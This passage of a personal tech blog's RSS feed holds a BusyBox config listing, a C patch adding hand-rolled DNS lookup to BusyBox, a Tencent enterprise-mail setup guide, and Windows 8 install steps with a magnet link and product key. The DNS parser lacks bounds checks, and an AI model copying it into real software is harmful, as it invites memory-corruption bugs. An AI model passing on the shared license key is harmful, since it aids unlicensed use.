<div>CONFIG_CHMOD=y</div>
<div>CONFIG_CHOWN=y</div>
<div>CONFIG_CHROOT=y</div>
<div>CONFIG_CKSUM=y</div>
<div>CONFIG_CP=y</div>
<div>CONFIG_DATE=y</div>
<div>CONFIG_FEATURE_DATE_ISOFMT=y</div>
<div>CONFIG_DD=y</div>
<div>CONFIG_FEATURE_DD_SIGNAL_HANDLING=y</div>
<div>CONFIG_DF=y</div>
<div>CONFIG_DIRNAME=y</div>
<div>CONFIG_DU=y</div>
<div>CONFIG_FEATURE_DU_DEFAULT_BLOCKSIZE_1K=y</div>
<div>CONFIG_ECHO=y</div>
<div>CONFIG_FEATURE_FANCY_ECHO=y</div>
<div>CONFIG_ENV=y</div>
<div>CONFIG_FEATURE_ENV_LONG_OPTIONS=y</div>
<div>CONFIG_EXPR=y</div>
<div>CONFIG_FALSE=y</div>
<div>CONFIG_HEAD=y</div>
<div>CONFIG_FEATURE_FANCY_HEAD=y</div>
<div>CONFIG_HOSTID=y</div>
<div>CONFIG_ID=y</div>
<div>CONFIG_LN=y</div>
<div>CONFIG_LS=y</div>
<div>CONFIG_FEATURE_LS_FILETYPES=y</div>
<div>CONFIG_FEATURE_LS_FOLLOWLINKS=y</div>
<div>CONFIG_FEATURE_LS_RECURSIVE=y</div>
<div>CONFIG_FEATURE_LS_SORTFILES=y</div>
<div>CONFIG_FEATURE_LS_TIMESTAMPS=y</div>
<div>CONFIG_FEATURE_LS_USERNAME=y</div>
<div>CONFIG_FEATURE_LS_COLOR=y</div>
<div>CONFIG_FEATURE_LS_COLOR_IS_DEFAULT=y</div>
<div>CONFIG_MD5SUM=y</div>
<div>CONFIG_MKDIR=y</div>
<div>CONFIG_FEATURE_MKDIR_LONG_OPTIONS=y</div>
<div>CONFIG_MKNOD=y</div>
<div>CONFIG_MV=y</div>
<div>CONFIG_FEATURE_MV_LONG_OPTIONS=y</div>
<div>CONFIG_NOHUP=y</div>
<div>CONFIG_PWD=y</div>
<div>CONFIG_REALPATH=y</div>
<div>CONFIG_RM=y</div>
<div>CONFIG_RMDIR=y</div>
<div>CONFIG_SEQ=y</div>
<div>CONFIG_SHA1SUM=y</div>
<div>CONFIG_SLEEP=y</div>
<div>CONFIG_SORT=y</div>
<div>CONFIG_FEATURE_SORT_BIG=y</div>
<div>CONFIG_STAT=y</div>
<div>CONFIG_FEATURE_STAT_FORMAT=y</div>
<div>CONFIG_SYNC=y</div>
<div>CONFIG_TAIL=y</div>
<div>CONFIG_FEATURE_FANCY_TAIL=y</div>
<div>CONFIG_TEST=y</div>
<div>CONFIG_TOUCH=y</div>
<div>CONFIG_TRUE=y</div>
<div>CONFIG_TTY=y</div>
<div>CONFIG_UNAME=y</div>
<div>CONFIG_UNIQ=y</div>
<div>CONFIG_WC=y</div>
<div>CONFIG_FEATURE_WC_LARGE=y</div>
<div>CONFIG_WHO=y</div>
<div>CONFIG_WHOAMI=y</div>
<div>CONFIG_YES=y</div>
<div>CONFIG_FEATURE_PRESERVE_HARDLINKS=y</div>
<div>CONFIG_FEATURE_AUTOWIDTH=y</div>
<div>CONFIG_FEATURE_HUMAN_READABLE=y</div>
<div>CONFIG_FEATURE_MD5_SHA1_SUM_CHECK=y</div>
<div>CONFIG_CLEAR=y</div>
<div>CONFIG_RESET=y</div>
<div>CONFIG_MKTEMP=y</div>
<div>CONFIG_READLINK=y</div>
<div>CONFIG_FEATURE_READLINK_FOLLOW=y</div>
<div>CONFIG_WHICH=y</div>
<div>CONFIG_AWK=y</div>
<div>CONFIG_FEATURE_AWK_MATH=y</div>
<div>CONFIG_PATCH=y</div>
<div>CONFIG_SED=y</div>
<div>CONFIG_VI=y</div>
<div>CONFIG_FEATURE_VI_COLON=y</div>
<div>CONFIG_FEATURE_VI_YANKMARK=y</div>
<div>CONFIG_FEATURE_VI_SEARCH=y</div>
<div>CONFIG_FEATURE_VI_USE_SIGNALS=y</div>
<div>CONFIG_FEATURE_VI_DOT_CMD=y</div>
<div>CONFIG_FEATURE_VI_READONLY=y</div>
<div>CONFIG_FEATURE_VI_SETOPTS=y</div>
<div>CONFIG_FEATURE_VI_SET=y</div>
<div>CONFIG_FEATURE_VI_WIN_RESIZE=y</div>
<div>CONFIG_FEATURE_VI_OPTIMIZE_CURSOR=y</div>
<div>CONFIG_FEATURE_ALLOW_EXEC=y</div>
<div>CONFIG_FIND=y</div>
<div>CONFIG_FEATURE_FIND_PRINT0=y</div>
<div>CONFIG_FEATURE_FIND_MTIME=y</div>
<div>CONFIG_FEATURE_FIND_MMIN=y</div>
<div>CONFIG_FEATURE_FIND_PERM=y</div>
<div>CONFIG_FEATURE_FIND_TYPE=y</div>
<div>CONFIG_FEATURE_FIND_XDEV=y</div>
<div>CONFIG_FEATURE_FIND_NEWER=y</div>
<div>CONFIG_FEATURE_FIND_INUM=y</div>
<div>CONFIG_FEATURE_FIND_EXEC=y</div>
<div>CONFIG_FEATURE_FIND_USER=y</div>
<div>CONFIG_FEATURE_FIND_NOT=y</div>
<div>CONFIG_GREP=y</div>
<div>CONFIG_FEATURE_GREP_EGREP_ALIAS=y</div>
<div>CONFIG_FEATURE_GREP_FGREP_ALIAS=y</div>
<div>CONFIG_FEATURE_GREP_CONTEXT=y</div>
<div>CONFIG_XARGS=y</div>
<div>CONFIG_FEATURE_XARGS_SUPPORT_CONFIRMATION=y</div>
<div>CONFIG_FEATURE_XARGS_SUPPORT_QUOTES=y</div>
<div>CONFIG_FEATURE_XARGS_SUPPORT_TERMOPT=y</div>
<div>CONFIG_FEATURE_XARGS_SUPPORT_ZERO_TERM=y</div>
<div>CONFIG_INIT=y</div>
<div>CONFIG_FEATURE_USE_INITTAB=y</div>
<div>CONFIG_FEATURE_INIT_SYSLOG=y</div>
<div>CONFIG_FEATURE_INITRD=y</div>
<div>CONFIG_HALT=y</div>
<div>CONFIG_MESG=y</div>
<div>CONFIG_FEATURE_SHADOWPASSWDS=y</div>
<div>CONFIG_USE_BB_SHADOW=y</div>
<div>CONFIG_USE_BB_PWD_GRP=y</div>
<div>CONFIG_ADDGROUP=y</div>
<div>CONFIG_DELGROUP=y</div>
<div>CONFIG_ADDUSER=y</div>
<div>CONFIG_DELUSER=y</div>
<div>CONFIG_GETTY=y</div>
<div>CONFIG_FEATURE_UTMP=y</div>
<div>CONFIG_FEATURE_WTMP=y</div>
<div>CONFIG_LOGIN=y</div>
<div>CONFIG_PASSWD=y</div>
<div>CONFIG_FEATURE_PASSWD_WEAK_CHECK=y</div>
<div>CONFIG_SU=y</div>
<div>CONFIG_FEATURE_SU_SYSLOG=y</div>
<div>CONFIG_FEATURE_SU_CHECKS_SHELLS=y</div>
<div>CONFIG_DMESG=y</div>
<div>CONFIG_FEATURE_DMESG_PRETTY=y</div>
<div>CONFIG_FDISK=y</div>
<div>CONFIG_FDISK_SUPPORT_LARGE_DISKS=y</div>
<div>CONFIG_FEATURE_FDISK_WRITABLE=y</div>
<div>CONFIG_GETOPT=y</div>
<div>CONFIG_MDEV=y</div>
<div>CONFIG_MKSWAP=y</div>
<div>CONFIG_MORE=y</div>
<div>CONFIG_FEATURE_USE_TERMIOS=y</div>
<div>CONFIG_MOUNT=y</div>
<div>CONFIG_FEATURE_MOUNT_FLAGS=y</div>
<div>CONFIG_FEATURE_MOUNT_FSTAB=y</div>
<div>CONFIG_SWAPONOFF=y</div>
<div>CONFIG_UMOUNT=y</div>
<div>CONFIG_FEATURE_UMOUNT_ALL=y</div>
<div>CONFIG_FEATURE_MOUNT_LOOP=y</div>
<div>CONFIG_LAST=y</div>
<div>CONFIG_LESS=y</div>
<div>CONFIG_FEATURE_LESS_MAXLINES=9999999</div>
<div>CONFIG_FEATURE_LESS_BRACKETS=y</div>
<div>CONFIG_FEATURE_LESS_FLAGS=y</div>
<div>CONFIG_FEATURE_LESS_FLAGCS=y</div>
<div>CONFIG_FEATURE_LESS_MARKS=y</div>
<div>CONFIG_FEATURE_LESS_REGEXP=y</div>
<div>CONFIG_HDPARM=y</div>
<div>CONFIG_FEATURE_HDPARM_GET_IDENTITY=y</div>
<div>CONFIG_MOUNTPOINT=y</div>
<div>CONFIG_TIME=y</div>
<div>CONFIG_ARP=y</div>
<div>CONFIG_FTPGET=y</div>
<div>CONFIG_FTPPUT=y</div>
<div>CONFIG_FEATURE_FTPGETPUT_LONG_OPTIONS=y</div>
<div>CONFIG_HOSTNAME=y</div>
<div>CONFIG_HTTPD=y</div>
<div>CONFIG_FEATURE_HTTPD_SETUID=y</div>
<div>CONFIG_FEATURE_HTTPD_BASIC_AUTH=y</div>
<div>CONFIG_FEATURE_HTTPD_AUTH_MD5=y</div>
<div>CONFIG_FEATURE_HTTPD_CGI=y</div>
<div>CONFIG_FEATURE_HTTPD_ENCODE_URL_STR=y</div>
<div>CONFIG_IFCONFIG=y</div>
<div>CONFIG_FEATURE_IFCONFIG_STATUS=y</div>
<div>CONFIG_FEATURE_IFCONFIG_SLIP=y</div>
<div>CONFIG_FEATURE_IFCONFIG_MEMSTART_IOADDR_IRQ=y</div>
<div>CONFIG_FEATURE_IFCONFIG_HW=y</div>
<div>CONFIG_FEATURE_IFCONFIG_BROADCAST_PLUS=y</div>
<div>CONFIG_IFUPDOWN=y</div>
<div>CONFIG_FEATURE_IFUPDOWN_IFCONFIG_BUILTIN=y</div>
<div>CONFIG_FEATURE_IFUPDOWN_IPV4=y</div>
<div>CONFIG_IP=y</div>
<div>CONFIG_FEATURE_IP_ADDRESS=y</div>
<div>CONFIG_FEATURE_IP_LINK=y</div>
<div>CONFIG_FEATURE_IP_ROUTE=y</div>
<div>CONFIG_FEATURE_IP_SHORT_FORMS=y</div>
<div>CONFIG_IPADDR=y</div>
<div>CONFIG_IPLINK=y</div>
<div>CONFIG_IPROUTE=y</div>
<div>CONFIG_NAMEIF=y</div>
<div>CONFIG_NETSTAT=y</div>
<div>CONFIG_NSLOOKUP=y</div>
<div>CONFIG_PING=y</div>
<div>CONFIG_FEATURE_FANCY_PING=y</div>
<div>CONFIG_ROUTE=y</div>
<div>CONFIG_TELNET=y</div>
<div>CONFIG_FEATURE_TELNET_TTYPE=y</div>
<div>CONFIG_FEATURE_TELNET_AUTOLOGIN=y</div>
<div>CONFIG_TELNETD=y</div>
<div>CONFIG_FEATURE_TELNETD_STANDALONE=y</div>
<div>CONFIG_TFTP=y</div>
<div>CONFIG_FEATURE_TFTP_GET=y</div>
<div>CONFIG_FEATURE_TFTP_PUT=y</div>
<div>CONFIG_TRACEROUTE=y</div>
<div>CONFIG_FEATURE_TRACEROUTE_VERBOSE=y</div>
<div>CONFIG_APP_UDHCPC=y</div>
<div>CONFIG_FEATURE_RFC3397=y</div>
<div>CONFIG_WGET=y</div>
<div>CONFIG_FEATURE_WGET_STATUSBAR=y</div>
<div>CONFIG_FEATURE_WGET_AUTHENTICATION=y</div>
<div>CONFIG_FEATURE_WGET_LONG_OPTIONS=y</div>
<div>CONFIG_FREE=y</div>
<div>CONFIG_FUSER=y</div>
<div>CONFIG_KILL=y</div>
<div>CONFIG_KILLALL=y</div>
<div>CONFIG_PIDOF=y</div>
<div>CONFIG_FEATURE_PIDOF_SINGLE=y</div>
<div>CONFIG_FEATURE_PIDOF_OMIT=y</div>
<div>CONFIG_PS=y</div>
<div>CONFIG_FEATURE_PS_WIDE=y</div>
<div>CONFIG_BB_SYSCTL=y</div>
<div>CONFIG_TOP=y</div>
<div>CONFIG_FEATURE_TOP_CPU_USAGE_PERCENTAGE=y</div>
<div>CONFIG_UPTIME=y</div>
<div>CONFIG_FEATURE_SH_IS_ASH=y</div>
<div>CONFIG_ASH=y</div>
<div>CONFIG_ASH_JOB_CONTROL=y</div>
<div>CONFIG_ASH_READ_NCHARS=y</div>
<div>CONFIG_ASH_READ_TIMEOUT=y</div>
<div>CONFIG_ASH_ALIAS=y</div>
<div>CONFIG_ASH_MATH_SUPPORT=y</div>
<div>CONFIG_ASH_GETOPTS=y</div>
<div>CONFIG_ASH_BUILTIN_ECHO=y</div>
<div>CONFIG_ASH_BUILTIN_TEST=y</div>
<div>CONFIG_ASH_MAIL=y</div>
<div>CONFIG_ASH_OPTIMIZE_FOR_SIZE=y</div>
<div>CONFIG_ASH_EXPAND_PRMT=y</div>
<div>CONFIG_SYSLOGD=y</div>
<div>CONFIG_FEATURE_ROTATE_LOGFILE=y</div>
<div>CONFIG_FEATURE_IPC_SYSLOG=y</div>
<div>CONFIG_FEATURE_IPC_SYSLOG_BUFFER_SIZE=16</div>
<div>CONFIG_LOGREAD=y</div>
<div>CONFIG_FEATURE_LOGREAD_REDUCED_LOCKING=y</div>
<div>CONFIG_KLOGD=y</div>
<div>CONFIG_LOGGER=y</div>
]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200932305433353/</guid>
    </item>
    <item>
      <title>
<![CDATA[busybox无法ping域名的解决办法]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009327101324432/</link>
      <description>
<![CDATA[$ ping www.google.com<br>ping : bad address 'www.google.com<br>1.5.1和1.14.0的busybox都一样, 网上有人讲需要libnss_dns* ...文件, 拷贝过去还是不能用,<br><br>手编2.6.21内核+手编1.5.1busybox+一堆deb包解压缩出gcc, 一个自定义的linux基本完成了,就差这么一个东西, hack源代码... <br>最终发现getaddrinfo这个函数调用失败，解决思路就是模拟dns协议把域名发给dns服务器，把域名转化为ip，然后再调用getaddrinfo，试验成功。<br><br>1. 把下面这段代码加入libbb/xconnect.c的开头<br>2. 把xconnect.c的str2sockaddr函数中getaddrinfo改为hgetaddrinfo，<br>3. 把下面这段代码中的dnsip改为自己的dns(懒得写读dns的代码了)<br>/** patch of hankjin */<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/socket.h&gt;<br>#include &lt;netinet/in.h&gt;<br>#include &lt;arpa/inet.h&gt;<br>#include &lt;netdb.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;string.h&gt;<br>#define oops(msg) { perror(msg); exit(1);}<br><br>void fillip(char* buffer, const char* ip);<br>char* name2ip(const char* name);<br>/**<br>&nbsp;*&nbsp; * head len: 12<br>&nbsp;*&nbsp;&nbsp; * query: ? + 4<br>&nbsp;*&nbsp;&nbsp;&nbsp; * total: strlen(query.buffer) + 16<br>&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp; */<br>typedef struct{<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; u_short txid;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; u_short flag;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; u_short question;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; u_short answer;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; u_short authority;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; u_short additional;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; char buffer[256];<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; struct {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; u_short type;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; u_short cls;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }query;<br>}dns_req;<br>/** length of resp: 12 */<br>typedef struct{<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; u_short txid;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; u_short flag;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; u_short question;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; u_short answer;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; u_short authority;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; u_short addtional;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; char buffer[1024];<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; struct{<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; u_short name;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; u_short type;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; u_short cls;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; u_short live_l;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; u_short live_h;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; u_short len;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; struct in_addr addr;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }resp;<br>}dns_res;<br><br>int hgetaddrinfo(const char *node, const char *service,<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; const struct addrinfo *hints,<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; struct addrinfo **res){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; /*&nbsp;&nbsp;&nbsp; int rc = getaddrinfo(node,service,hints,res);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;*&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(rc == 0)//todo: != -&gt; ==<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;*&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return rc;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;*&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; */<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; char *ip = name2ip(node);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return getaddrinfo(ip,service,hints,res);<br>}<br>char * name2ip(const char *node){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; struct sockaddr_in dns;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; dns_req req;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; dns_res res;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; int sockid, len, index;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; char* dnsip = "202.114.215.73";<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; sockid = socket(PF_INET, SOCK_DGRAM, 0);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(sockid == -1)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oops("socket");<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; memset((void*)&amp;dns, 0, sizeof(dns));<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; dns.sin_family = AF_INET;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; dns.sin_port = htons(53);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; dns.sin_addr.s_addr = inet_addr(dnsip);<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; memset((void*)&amp;req, 0, sizeof(req));<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; req.txid = htons(0x4419);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; req.flag = htons(0x0100);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; req.question = htons(1);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; fillip(req.buffer,node);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; req.query.type=htons(1);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; req.query.cls=htons(1);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; memcpy(req.buffer+strlen(req.buffer)+1, (void*)(&amp;req.query), sizeof(req.query));<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; sendto(sockid, (void*)&amp;req, strlen(req.buffer)+17, 0, <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; (struct sockaddr*)&amp;dns, sizeof(dns));<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; recvfrom(sockid, (void*)&amp;res, sizeof(res), 0, <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; (struct sockaddr*)&amp;dns, &amp;len);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; index = strlen(res.buffer)+5;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; while(1){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; memcpy((void*)&amp;(res.resp), res.buffer+index, 12);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(ntohs(res.resp.type)==1){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; memcpy((void*)&amp;(res.resp.addr), res.buffer+index+12, 4);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; index += ntohs(res.resp.len) + 12;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return inet_ntoa(res.resp.addr);<br>}<br><br>void fillip(char* buffer, const char* ip){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; int i,j=0;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; for(i = 0; ip[i] != 0; i ++){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(ip[i] != '.'){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; buffer[i+1] = ip[i];<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; else{<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; buffer[j] = i - j;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; j = i + 1;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; buffer[j] = i - j;<br>}<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009327101324432/</guid>
    </item>
    <item>
      <title>
<![CDATA[腾讯企业邮箱]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010101945126230/</link>
      <description>
<![CDATA[1.申请域名<br>如果有米，就很好办了，万网等都有得买，淘宝上也有。如果没米呢，就去申请个免费的：<br>http://twbbs.org提供免费二级域名,xxx.twbbs.org，xxx.cnkk.org等，而且可以设置DNS，虽然被墙了，不过可以用Web代理访问，这个Web代理就很好：http://s1.proxyexe.com/，注意要去除Remove Scripts选项，因为twbbs.org上用到了Javascript.<br>选择“註冊新 twbbs 網域”，注册一个域名<br>續用?刪除 網域 <br><br><br>2.申请企业邮箱<br>Google提供企业邮箱服务，可是被墙了，翻啊翻好像翻不出去，总之很麻烦。<br>不过最近QQ也有了企业邮箱服务，去http://exmail.qq.com/申请个帐户，然后绑定上面的域名，再根据说明去twbbs.org进行相应的设置<br><br>3.设置域名DNS<br>最后根据QQ企业邮箱的说明，在twbbs.org设置好域名的DNS就可以了<br>选择“設定?修改 網域 ”，然后选择设定-&gt;设定DNS，进行配置，例如：<br><span>qqmailc41694d4.</span>cbib.cnkk.org&nbsp;&nbsp;&nbsp; IN&nbsp;&nbsp;&nbsp; CNAME &nbsp;&nbsp;&nbsp;&nbsp; mail.qq.com<br>mail.cbib.cnkk.org&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IN&nbsp;&nbsp;&nbsp; CNAME &nbsp; &nbsp;&nbsp; exmail.qq.com<br>cbib.cnkk.org&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IN&nbsp;&nbsp;&nbsp; MX&nbsp;&nbsp;&nbsp;&nbsp; 10&nbsp;&nbsp;&nbsp; mxbiz2.qq.com<br>cbib.cnkk.org&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IN&nbsp;&nbsp;&nbsp; MX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5&nbsp; &nbsp;&nbsp; mxbiz1.qq.com]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Admin</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010101945126230/</guid>
    </item>
    <item>
      <title>
<![CDATA[Win8]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372012773173181/</link>
      <description>
<![CDATA[1. 下载Win8 Professional版,解压缩到F盘根目录<br><a rel="nofollow" href="magnet:?xt=urn:btih:5990C764FC3E36EA583B80FD3A16A2D9DB3441D9"  >magnet:?xt=urn:btih:5990C764FC3E36EA583B80FD3A16A2D9DB3441D9</a><br>2. 下载hdd installer, 运行<br>3. 重启后，按提示输入CODE<br><wbr>XKY4K-2NRWR-8F6P2-448RF-CRYQH<br>4. 安装完成后<br>4.1. 增加中文语言<br>4.2. 非unicode默认中文，重启<br>5. 加入域<br>5.1. lusrmgr.msc 取消帐户禁用<br>5.2. netplwiz取消输出密码<br>5.3. 用administrator登录<br>5.4. 用分公司工具加域成功重启]]>      </description>
